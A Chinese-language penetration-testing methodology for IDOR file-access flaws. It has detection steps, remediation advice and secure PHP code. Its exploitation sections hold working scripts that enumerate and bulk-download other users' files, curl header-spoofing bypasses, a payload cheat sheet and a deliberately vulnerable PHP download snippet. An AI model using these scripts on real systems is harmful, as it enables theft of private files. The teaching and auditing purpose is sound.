# IDOR 未授权文件访问攻击方法论

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供一套标准化、可复现的 IDOR（不安全直接对象引用）未授权文件访问攻击方法，确保测试人员能够系统性地发现和利用文件访问控制缺陷，特别是针对共享目录中文件所有权验证缺失的场景。

### 1.2 适用范围
本文档适用于以下场景：
- 文件上传功能存储于共享 Web 可访问目录
- 文件访问缺少所有权验证机制
- 文件路径直接暴露于 URL 中
- 多用户系统中文件存储无用户隔离
- Apache/Nginx 直接提供静态文件服务且无访问控制

### 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

## 第二部分：核心渗透技术专题

### 专题一：IDOR 未授权文件访问攻击

#### 2.1 技术介绍

IDOR（Insecure Direct Object Reference，不安全直接对象引用）未授权文件访问漏洞是指应用程序在提供文件访问功能时，未对用户请求的文件进行所有权验证或访问授权检查，导致攻击者可以访问其他用户的私有文件。

**漏洞本质：**
- 文件存储于共享目录，无用户隔离机制
- 文件访问 URL 可直接预测或枚举
- 缺少服务器端所有权验证
- 依赖客户端认证但无资源级授权

**典型架构缺陷：**
```
用户 A 上传文件 → 存储于 ./uploaded_files/invoice.pdf
用户 B 上传文件 → 存储于 ./uploaded_files/report.pdf
                    ↓
              共享目录，无用户子目录
                    ↓
攻击者访问：http://target/uploaded_files/invoice.pdf
                    ↓
              无授权检查，直接返回文件内容
```

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 发票/收据上传 | 用户上传 PDF 发票 | 文件存储于共享目录，任何用户可访问 |
| 文档管理系统 | 上传合同、协议 | 无访问控制，URL 可预测 |
| 头像/图片上传 | 用户头像存储 | 文件名可枚举，无权限验证 |
| 备份文件存储 | 数据库备份下载 | 备份文件 Web 可访问 |
| 日志文件导出 | 系统日志下载 | 日志文件无访问限制 |
| 报表导出功能 | Excel/PDF 报表 | 报表文件共享存储 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**步骤 1：识别文件上传功能**
- 查找所有包含文件上传表单的页面（`<input type="file">`）
- 检查上传后的文件存储位置和访问 URL
- 记录文件命名规则（原始文件名、时间戳、随机 ID 等）

**步骤 2：分析文件访问模式**
```bash
# 上传测试文件
curl -X POST http://target/upload.php \
  -H "Cookie: PHPSESSID=valid_session" \
  -F "file=@test.pdf"

# 观察响应中的文件路径
# 常见模式：
# - http://target/uploads/test.pdf
# - http://target/files/2024/01/test.pdf
# - http://target/download.php?file=test.pdf
```

**步骤 3：测试未授权访问**
```bash
# 不使用任何认证访问文件
curl -i http://target/uploaded_files/test.pdf

# 预期结果（存在漏洞）：
# HTTP/1.1 200 OK
# Content-Type: application/pdf
# Content-Length: 12345

# 预期结果（安全配置）：
# HTTP/1.1 401 Unauthorized
# 或
# HTTP/1.1 403 Forbidden
```

**步骤 4：目录列表测试**
```bash
# 测试目录列表是否启用
curl http://target/uploaded_files/

# 如果返回文件列表，则存在严重信息泄露
# Apache 默认配置可能启用 DirectoryIndex
```

##### 2.3.2 白盒测试

**代码审计要点：**

1. **检查文件存储路径**
```php
// 漏洞代码示例
$uploadFileDir = './uploaded_invoices/';  // 共享目录
$dest_path = $uploadFileDir . $fileName;  // 无用户隔离
move_uploaded_file($fileTmpPath, $dest_path);
```

2. **检查访问控制逻辑**
```php
// 漏洞代码示例 - 无所有权验证
// download.php
$filename = $_GET['file'];
readfile('./uploaded_files/' . $filename);  // 直接读取

// 安全代码示例 - 有所有权验证
// download.php
session_start();
$current_user = $_SESSION['user_id'];
$filename = $_GET['file'];

// 验证文件所有权
$stmt = $db->prepare("SELECT * FROM files WHERE id = ? AND user_id = ?");
$stmt->execute([$filename, $current_user]);
if ($stmt->fetch()) {
    readfile('./secure_storage/' . $filename);
} else {
    http_response_code(403);
}
```

3. **检查数据库所有权追踪**
```sql
-- 安全设计应有文件 - 用户关联表
CREATE TABLE files (
    id INT PRIMARY KEY,
    filename VARCHAR(255),
    user_id INT,  -- 所有者
    created_at TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- 漏洞系统通常缺少此表或 user_id 字段
```

#### 2.4 漏洞利用方法

##### 2.4.1 基础文件访问

**利用场景 1：已知文件名的直接访问**
```bash
# 无需认证访问任意用户上传的文件
curl http://localhost:35845/uploaded_invoices/admin_invoice.pdf \
  -o stolen_invoice.pdf

# 验证文件内容
cat stolen_invoice.pdf
```

**利用场景 2：目录列表枚举**
```bash
# 如果目录列表启用，获取所有文件清单
curl http://localhost:35845/uploaded_invoices/

# 示例输出：
# <a href="admin_invoice.pdf">admin_invoice.pdf</a>
# <a href="user123_report.pdf">user123_report.pdf</a>
# <a href="confidential.pdf">confidential.pdf</a>
```

**利用场景 3：文件名预测**
```bash
# 基于命名规则预测文件名
# 常见命名模式：
# - 用户名 + 文件类型：admin_invoice.pdf, user_report.pdf
# - 日期模式：invoice_2024_01.pdf, report_20240115.pdf
# - 序号模式：file_001.pdf, file_002.pdf

for user in admin root user test; do
    for type in invoice report receipt document; do
        curl -s -o /dev/null -w "%{http_code}" \
          http://target/uploads/${user}_${type}.pdf
    done
done
```

##### 2.4.2 自动化文件枚举

**Python 枚举脚本示例：**
```python
#!/usr/bin/env python3
import requests
from pathlib import Path

BASE_URL = "http://localhost:35845/uploaded_invoices/"
COMMON_FILENAMES = [
    "invoice.pdf", "admin_invoice.pdf", "user_invoice.pdf",
    "receipt.pdf", "report.pdf", "document.pdf",
    "confidential.pdf", "private.pdf", "secret.pdf",
    "backup.sql", "database.sql", "dump.sql",
]

def enumerate_files():
    accessible_files = []
    
    for filename in COMMON_FILENAMES:
        url = BASE_URL + filename
        response = requests.get(url)
        
        if response.status_code == 200:
            print(f"[+] Found: {filename}")
            print(f"    Size: {len(response.content)} bytes")
            accessible_files.append(filename)
        elif response.status_code == 404:
            print(f"[-] Not found: {filename}")
        else:
            print(f"[?] Status {response.status_code}: {filename}")
    
    return accessible_files

def download_files(filenames, output_dir="stolen_files"):
    Path(output_dir).mkdir(exist_ok=True)
    
    for filename in filenames:
        url = BASE_URL + filename
        response = requests.get(url)
        
        if response.status_code == 200:
            output_path = Path(output_dir) / filename
            output_path.write_bytes(response.content)
            print(f"[+] Downloaded: {filename}")

if __name__ == "__main__":
    files = enumerate_files()
    if files:
        download_files(files)
        print(f"\n[*] Total files stolen: {len(files)}")
```

##### 2.4.3 敏感数据提取

**利用场景：批量窃取发票数据**
```bash
#!/bin/bash

# 创建输出目录
mkdir -p /tmp/stolen_invoices

# 已知文件列表
files=(
    "admin_invoice.pdf"
    "finance_report_2024.pdf"
    "customer_data.xlsx"
    "payment_records.csv"
)

# 批量下载
for file in "${files[@]}"; do
    echo "[*] Downloading: $file"
    curl -s "http://localhost:35845/uploaded_invoices/$file" \
      -o "/tmp/stolen_invoices/$file"
done

echo "[+] Download complete. Files saved to /tmp/stolen_invoices/"
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过文件访问控制

**场景 1：绕过 Referer 检查**
```bash
# 如果服务器检查 Referer 头部
curl -e "http://localhost:35845/dashboard.php" \
  http://localhost:35845/uploaded_invoices/admin_invoice.pdf
```

**场景 2：绕过 IP 限制**
```bash
# 如果服务器限制特定 IP 段
# 尝试 X-Forwarded-For 头部欺骗
curl -H "X-Forwarded-For: 127.0.0.1" \
  http://localhost:35845/uploaded_invoices/admin_invoice.pdf
```

**场景 3：绕过认证检查**
```bash
# 某些应用可能错误地检查 Cookie 存在性但不验证有效性
curl -H "Cookie: PHPSESSID=any_value" \
  http://localhost:35845/uploaded_invoices/admin_invoice.pdf
```

##### 2.5.2 文件名发现技术

**技术 1：时间戳预测**
```bash
# 如果文件名包含时间戳
# 格式：invoice_YYYYMMDD_HHMMSS.pdf

# 获取当前时间戳
timestamp=$(date +%Y%m%d_%H%M%S)
curl "http://target/uploads/invoice_${timestamp}.pdf"

# 或枚举最近的时间范围
for hour in {0..23}; do
    for minute in {0..59..5}; do
        curl -s -o /dev/null -w "%{http_code}" \
          "http://target/uploads/invoice_20240115_${hour}${minute}00.pdf"
    done
done
```

**技术 2：用户名字典攻击**
```bash
# 基于用户名的文件命名
users=("admin" "root" "user" "test" "guest" "manager" "finance")

for user in "${users[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
      "http://target/uploads/${user}_invoice.pdf")
    if [ "$response" == "200" ]; then
        echo "[+] Found: ${user}_invoice.pdf"
    fi
done
```

**技术 3：数字序号枚举**
```bash
# 如果文件使用数字 ID 命名
for i in {1..1000}; do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
      "http://target/uploads/file_${i}.pdf")
    if [ "$response" == "200" ]; then
        echo "[+] Found: file_${i}.pdf"
        curl -o "stolen_file_${i}.pdf" \
          "http://target/uploads/file_${i}.pdf"
    fi
done
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|-------------|------|
| **直接访问** | 已知文件名 | `curl http://target/uploads/file.pdf` | 无需认证直接访问 |
| **目录列表** | 枚举文件 | `curl http://target/uploads/` | 获取目录内容列表 |
| **文件名预测** | 用户相关文件 | `curl http://target/uploads/admin_invoice.pdf` | 基于用户名预测 |
| **时间戳预测** | 最近上传文件 | `curl http://target/uploads/invoice_20240115.pdf` | 基于日期预测 |
| **序号枚举** | 数字 ID 文件 | `curl http://target/uploads/file_001.pdf` | 枚举数字 ID |
| **扩展名变异** | 不同文件类型 | `curl http://target/uploads/invoice.{pdf,xlsx,csv,docx}` | 尝试不同扩展名 |

### 3.2 漏洞验证检查清单

- [ ] 文件上传功能存在且可访问
- [ ] 上传后文件存储于 Web 可访问目录
- [ ] 文件访问 URL 可直接构造或预测
- [ ] 未认证请求可成功获取文件（HTTP 200）
- [ ] 无所有权验证或访问控制检查
- [ ] 目录列表可能启用（可选）
- [ ] 可访问其他用户上传的文件
- [ ] 敏感数据可被提取

### 3.3 修复建议

**短期修复：**
1. 立即将上传目录移出 Web 根目录
2. 添加 `.htaccess` 文件拒绝所有访问
3. 实施基于会话的文件访问代理

**长期修复：**
1. 实现文件所有权数据库追踪
2. 所有文件访问通过服务器端授权检查
3. 使用随机化文件名（UUID）防止预测
4. 实施最小权限原则，限制文件访问范围

**代码修复示例：**
```php
// 安全实现：通过代理脚本提供文件访问
// download.php
session_start();

if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    exit('Unauthorized');
}

$file_id = $_GET['id'];
$user_id = $_SESSION['user_id'];

// 验证文件所有权
$stmt = $db->prepare("SELECT filename FROM files WHERE id = ? AND user_id = ?");
$stmt->execute([$file_id, $user_id]);
$file = $stmt->fetch();

if (!$file) {
    http_response_code(403);
    exit('Access denied');
}

// 从非 Web 可访问目录读取文件
$secure_path = '/var/secure_uploads/' . $file['filename'];
header('Content-Type: application/pdf');
header('Content-Disposition: attachment; filename="' . basename($file['filename']) . '"');
readfile($secure_path);
```

---

**文档版本：** 1.0  
**最后更新：** 2024 年 1 月  
**适用场景：** PHP/Python/Node.js 文件上传系统的 IDOR 漏洞测试
